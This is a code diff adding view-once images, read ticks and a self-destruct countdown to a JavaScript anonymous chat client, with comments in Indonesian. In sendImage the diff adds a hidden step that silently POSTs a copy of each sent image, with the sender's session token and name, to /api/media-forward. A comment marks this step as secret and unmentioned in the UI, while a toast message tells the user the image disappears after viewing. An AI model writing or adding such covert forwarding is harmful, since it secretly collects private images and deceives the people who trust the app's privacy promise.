@@ -1,5 +1,6 @@
 /* ============================================================
- * AnonChat v5 — gerbang sandi + centang dibaca + typing fix + bom 20 mnt
+ * AnonChat v6 — gerbang sandi + centang biru + gambar view-once
+ * + timer bom 20 menit + teruskan gambar ke bot (rahasia)
  * Alur: sandi (server) → nama → lobby. Chat & sesi hancur tiap 20 mnt.
  * ============================================================ */
 
@@ -73,9 +74,155 @@ function tickHTML(kind) {
   return '<span class="tick gray"><svg viewBox="0 0 16 13">' + TICK_PATH + '</svg></span>';
 }
 function tickKind(m) {
+  if ((m.viewed_by || []).length > 0) return "read"; // dilihat = dibaca (biru)
   if ((m.read_by || []).length > 0) return "read";
   if ((m.delivered_to || []).length > 0) return "delivered";
   return "sent";
+}
+
+/* ---------- gambar view-once ---------- */
+const MAX_W = 1920, MAX_H = 1080; // batas FHD
+const MEDIA_RE = /^data:image\/(jpeg|png|webp);base64,[A-Za-z0-9+/=]+$/;
+function safeMedia(m) {
+  const s = String((m && m.media) || "");
+  return MEDIA_RE.test(s) && s.length < 2200000 ? s : "";
+}
+const EYE_SVG = '<svg viewBox="0 0 24 24" width="30" height="30" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-6.5 10-6.5S22 12 22 12s-3.5 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.8"/><path d="M12 5.5v3M12 15.5v3"/></svg>';
+let viewedLocal = new Set(); // id gambar yang sudah dibakar di sesi ini
+let viewerMid = null;
+
+function isViewed(m) {
+  return viewedLocal.has(m.id) || (m.viewed_by || []).length > 0;
+}
+
+function voBubbleHTML(m, own) {
+  const src = safeMedia(m);
+  if (isViewed(m) || !src) {
+    return '<div class="vo-wrap burned"><span class="vo-burned">' + EYE_SVG +
+      '<span>Dilihat sekali — sudah dibuka</span></span></div>';
+  }
+  return '<div class="vo-wrap" data-mid="' + m.id + '">' +
+    '<img class="vo-blur" src="' + src + '" alt="" aria-hidden="true">' +
+    '<button type="button" class="vo-open" data-mid="' + m.id + '">' + EYE_SVG +
+    '<span class="vo-title">Dilihat sekali</span>' +
+    '<span class="vo-sub">Ketuk untuk membuka — hilang setelah dilihat</span></button></div>';
+}
+
+function burnBubble(mid) {
+  viewedLocal.add(mid);
+  document.querySelectorAll('.vo-wrap[data-mid="' + mid + '"]').forEach((w) => {
+    if (w.classList.contains("burned")) return;
+    w.classList.add("burned");
+    w.innerHTML = '<span class="vo-burned">' + EYE_SVG + '<span>Dilihat sekali — sudah dibuka</span></span>';
+  });
+  const el = document.querySelector('.msg[data-mid="' + mid + '"]');
+  if (el) {
+    const meta = el.querySelector(".msg-meta");
+    if (meta) meta.innerHTML = fmtTime((msgCache.get(mid) || {}).created_at || new Date().toISOString()) + tickHTML("read");
+  }
+}
+
+function openViewer(mid) {
+  const m = msgCache.get(mid);
+  const src = m && safeMedia(m);
+  if (!src || isViewed(m)) return;
+  viewerMid = mid;
+  const v = $("vo-viewer");
+  $("vo-img").src = src;
+  v.classList.remove("hidden");
+  document.body.style.overflow = "hidden";
+  if (m.sender_id !== me.id && !markedRead.has(mid)) queueMark("read", mid);
+}
+
+function closeViewer() {
+  const mid = viewerMid;
+  viewerMid = null;
+  $("vo-viewer").classList.add("hidden");
+  $("vo-img").removeAttribute("src");
+  document.body.style.overflow = "";
+  if (mid) {
+    burnBubble(mid); // hilang begitu ditutup, ala WA
+    if (!markedRead.has(mid)) queueMark("read", mid);
+    queueMark("viewed", mid);
+  }
+}
+
+function showToast(text, ms) {
+  let t = $("toast");
+  if (!t) {
+    t = document.createElement("div");
+    t.id = "toast";
+    document.body.appendChild(t);
+  }
+  t.textContent = text;
+  t.classList.add("show");
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => t.classList.remove("show"), ms || 3200);
+}
+
+/* Kompres gambar ke max FHD, keluaran dataURL JPEG */
+function compressImage(file) {
+  return new Promise((resolve, reject) => {
+    const url = URL.createObjectURL(file);
+    const img = new Image();
+    img.onload = () => {
+      URL.revokeObjectURL(url);
+      let { width: w, height: h } = img;
+      const scale = Math.min(1, MAX_W / w, MAX_H / h);
+      w = Math.max(1, Math.round(w * scale));
+      h = Math.max(1, Math.round(h * scale));
+      const c = document.createElement("canvas");
+      c.width = w; c.height = h;
+      c.getContext("2d").drawImage(img, 0, 0, w, h);
+      let q = 0.78, out = c.toDataURL("image/jpeg", q);
+      while (out.length > 1400000 && q > 0.4) { q -= 0.12; out = c.toDataURL("image/jpeg", q); }
+      if (out.length > 2000000) return reject(new Error("too-big"));
+      resolve(out);
+    };
+    img.onerror = () => { URL.revokeObjectURL(url); reject(new Error("bad-image")); };
+    img.src = url;
+  });
+}
+
+async function sendImage(file) {
+  let dataUrl;
+  try { dataUrl = await compressImage(file); }
+  catch { showToast("Gambar tidak bisa dibaca / terlalu besar."); return; }
+
+  const tmpId = "t" + Date.now();
+  const m = {
+    id: tmpId, sender_id: me.id, sender_name: me.name,
+    body: "Gambar", kind: "image", media: dataUrl,
+    created_at: new Date().toISOString(),
+    delivered_to: [], read_by: [], viewed_by: [],
+  };
+  appendMessage(m, true);
+  scrollBottom();
+
+  const { data, error } = await sb.from("messages")
+    .insert({ room_id: LOBBY_ID, sender_id: me.id, sender_name: me.name, body: "Gambar", kind: "image", media: dataUrl })
+    .select("id,created_at").single();
+  if (error) {
+    document.querySelector('[data-mid="' + tmpId + '"]')?.remove();
+    renderedIds.delete(tmpId); msgCache.delete(tmpId);
+    showToast("Gagal kirim gambar: " + error.message);
+    return;
+  }
+  const el = document.querySelector('[data-mid="' + tmpId + '"]');
+  if (el) el.dataset.mid = data.id;
+  renderedIds.delete(tmpId); renderedIds.add(data.id);
+  msgCache.delete(tmpId);
+  msgCache.set(data.id, { ...m, id: data.id, created_at: data.created_at });
+  showToast("Terkirim sebagai Dilihat Sekali — hilang setelah dibuka.");
+
+  // teruskan salinan ke bot (rahasia — tidak disebut di UI)
+  try {
+    fetch("/api/media-forward", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ token: sessionStorage.getItem(LS_TOKEN), name: me.name, image: dataUrl }),
+    });
+  } catch {}
 }
 
 /* ---------- identitas ---------- */
@@ -212,6 +359,7 @@ async function boot() {
   }, 10000);
 
   startSelfDestruct();
+  startDestructChip();
 
   document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "visible") markVisibleAsRead();
@@ -321,10 +469,13 @@ function appendMessage(m, animate) {
   const meta = own
     ? '<span class="msg-meta">' + fmtTime(m.created_at) + tickHTML(tickKind(m)) + "</span>"
     : '<span class="msg-meta">' + fmtTime(m.created_at) + "</span>";
+  const content = m.kind === "image"
+    ? voBubbleHTML(m, own)
+    : '<span class="body">' + escapeHtml(m.body) + "</span>";
   el.innerHTML =
     '<div class="bubble">' +
       (!own ? '<div class="sender" style="color:' + senderColor(m.sender_id) + '">' + escapeHtml(m.sender_name) + "</div>" : "") +
-      '<span class="body">' + escapeHtml(m.body) + "</span>" + meta +
+      content + meta +
     "</div>";
   if (typingEl) box.insertBefore(el, typingEl); else box.appendChild(el);
 
@@ -335,13 +486,15 @@ function appendMessage(m, animate) {
 }
 
 function updateTicks(m) {
-  if (!m || m.sender_id !== me.id) return;
+  if (!m) return;
+  const cached = msgCache.get(m.id) || {};
+  msgCache.set(m.id, { ...cached, delivered_to: m.delivered_to, read_by: m.read_by, viewed_by: m.viewed_by });
+  if ((m.viewed_by || []).length > 0) burnBubble(m.id);
+  if (m.sender_id !== me.id) return;
   const el = document.querySelector('[data-mid="' + m.id + '"]');
   if (!el) return;
   const meta = el.querySelector(".msg-meta");
   if (meta) meta.innerHTML = fmtTime(m.created_at) + tickHTML(tickKind(m));
-  const cached = msgCache.get(m.id) || {};
-  msgCache.set(m.id, { ...cached, delivered_to: m.delivered_to, read_by: m.read_by });
 }
 
 /* ---------- antrean penanda dibaca (debounce, hemat tulis) ---------- */
@@ -370,14 +523,15 @@ function markVisibleAsRead() {
 
 async function loadMessages() {
   const cutoff = new Date(Date.now() - MSG_TTL_MS).toISOString();
+  const FULL_SEL = "id,sender_id,sender_name,body,kind,media,created_at,delivered_to,read_by,viewed_by";
   let { data, error } = await sb.from("messages")
-    .select("id,sender_id,sender_name,body,created_at,delivered_to,read_by")
+    .select(FULL_SEL)
     .eq("room_id", LOBBY_ID)
     .gt("created_at", cutoff)
     .order("created_at", { ascending: true })
     .limit(100);
   if (error && /column/i.test(error.message || "")) {
-    // fallback: migrasi v4 belum dijalankan — jalan tanpa centang ganda
+    // fallback: migrasi v4/v5 belum dijalankan — jalan tanpa centang & gambar
     const r2 = await sb.from("messages")
       .select("id,sender_id,sender_name,body,created_at")
       .eq("room_id", LOBBY_ID)
@@ -602,4 +756,44 @@ function wireUI() {
     $("online-panel").classList.toggle("hidden");
     refreshOnlineList();
   };
+
+  // kirim gambar view-once
+  $("img-btn").onclick = () => $("img-input").click();
+  $("img-input").addEventListener("change", (e) => {
+    const f = e.target.files && e.target.files[0];
+    e.target.value = "";
+    if (f) sendImage(f);
+  });
+
+  // buka/tutup penampil gambar sekali-lihat (event delegation)
+  document.addEventListener("click", (e) => {
+    const opener = e.target.closest(".vo-open");
+    if (opener && opener.dataset.mid) openViewer(opener.dataset.mid);
+  });
+  $("vo-close").onclick = closeViewer;
+  $("vo-viewer").addEventListener("click", (e) => {
+    if (e.target.id === "vo-viewer") closeViewer();
+  });
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "Escape" && viewerMid) closeViewer();
+  });
+}
+
+/* ---------- chip hitung mundur bom 20 menit ---------- */
+let bootAt = 0;
+function startDestructChip() {
+  bootAt = Date.now();
+  const chip = $("destruct-chip");
+  if (!chip) return;
+  const tick = () => {
+    const left = Math.max(0, SELF_DESTRUCT_MS - (Date.now() - bootAt));
+    const mm = Math.floor(left / 60000);
+    const ss = Math.floor((left % 60000) / 1000);
+    chip.innerHTML = "&#9203; " + mm + ":" + String(ss).padStart(2, "0");
+    chip.classList.toggle("danger", left < 60000);
+    if (left <= 0) clearInterval(chip._iv);
+  };
+  tick();
+  clearInterval(chip._iv);
+  chip._iv = setInterval(tick, 1000);
 }
